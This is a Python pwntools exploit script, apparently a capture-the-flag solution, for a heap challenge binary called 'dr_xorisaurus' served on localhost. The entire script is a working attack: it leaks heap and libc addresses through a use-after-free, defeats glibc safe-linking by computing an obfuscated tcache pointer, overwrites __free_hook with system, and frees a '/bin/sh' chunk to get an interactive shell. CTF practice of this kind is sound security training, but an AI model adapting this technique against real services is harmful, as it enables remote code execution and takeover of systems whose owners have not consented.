from pwn import *
import proofofwork

elf = ELF('./dr_xorisaurus')
libc = ELF('./libc.so.6')

# context.log_level = 'debug'

# p = process(['disable_sigalarm', elf.path])
p = remote('localhost', 9200)
proof = p.recv(0x22).split(' ')[-2][:-1]
log.info('Proving based on: %s' % proof)
proof = proofofwork.sha256(proof)
log.info('Proof: %s' % proof)
p.sendline(proof)
log.info('Starting pwn')
def wait():
	p.recvrepeat(0.1)

def alloc(size, data):
	wait()
	p.sendline('1')
	wait()
	p.sendline(str(size))
	wait()
	p.sendline(data)

def show(idx):
	wait()
	p.sendline('2')
	wait()
	p.sendline(str(idx))

def free(idx):
	wait()
	p.sendline('3')
	wait()
	p.sendline(str(idx))

def uaf(idx, data):
	wait()
	p.sendline('4')
	wait()
	p.sendline(str(idx))
	wait()
	p.sendline('420')
	wait()
	p.send(data)

def trigger_consolidate(size):
	assert(size >= 0x500)
	wait()
	p.sendline('1'*size)

#apaprently well uh the shift and xor method... you can leak heap base trivially if you only free one thing lol, but you see, i made you type in a newline at least

for i in range(20):
	alloc(0x77, 'pepega')

for i in range(19): #leaves idx 19
	free(i)

trigger_consolidate(0x500)
#should get a largebin now
alloc(0x60, 'A' * 16)
show(0)
p.recv(0x10)
heapleak = u64(p.recv(6).ljust(8, '\x00')) + 0xf6
log.info('heap leak: 0x%x' % heapleak)
alloc(0x60, '')
show(1)
libc.address = u64(p.recv(6).ljust(8, '\x00')) - 0x1b8c0a
log.info('libc base: 0x%x' % libc.address)
free(0)
free(1)
#bypassing safe linking
alloc(0x50, '')
alloc(0x50, '')

#P' = (L >> 12) ^ P
#L is address, P is the pointer it should hold
evil_obfs = ((heapleak + 0x60) >> 12) ^ (libc.symbols['__free_hook'])

free(0)
free(1) #need more than one cause tcache count
alloc(0x50, '')
# context.log_level = 'debug'
uaf(0, p64(evil_obfs))
alloc(0x50, '')
# context.log_level = 'debug'
alloc(0x50, p64(libc.symbols['system']))
alloc(0x60, '/bin/sh')
free(3)
p.interactive()
